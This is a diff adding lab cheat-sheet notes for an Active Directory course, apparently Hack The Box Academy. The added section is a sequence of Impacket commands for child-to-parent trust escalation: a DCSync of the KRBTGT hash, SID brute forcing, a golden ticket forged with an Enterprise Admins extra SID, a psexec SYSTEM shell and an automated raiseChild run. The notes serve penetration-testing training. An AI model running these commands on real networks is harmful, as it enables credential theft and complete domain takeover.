@@ -1576,6 +1576,31 @@ lsadump::dcsync /user:INLANEFREIGHT\lab_adm
 # When dealing with multiple domains and our target domain is not the same as the user's domain, we will need to specify the exact domain to perform the DCSync operation
 lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
 
+########################################################################################################################################################################
+### Attacking Domain Trusts - Child -> Parent Trusts - from Linux
+
+# Once we have complete control of the child domain, we can use secretsdump.py to DCSync and grab the NTLM hash for the KRBTGT account.
+secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
+
+# Performing SID Brute Forcing using lookupsid.py
+lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240
+lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
+
+# Grabbing the Domain SID & Attaching to Enterprise Admin's RID
+lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
+
+# Constructing a Golden Ticket using ticketer.py
+ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
+
+# Setting the KRB5CCNAME Environment Variable
+export KRB5CCNAME=hacker.ccache
+
+# Getting a SYSTEM shell using Impacket's psexec.py
+psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
+
+# Performing the Attack with raiseChild.py
+raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
+
 ```
 
 ##### Trust Relationships - Cross-Forest
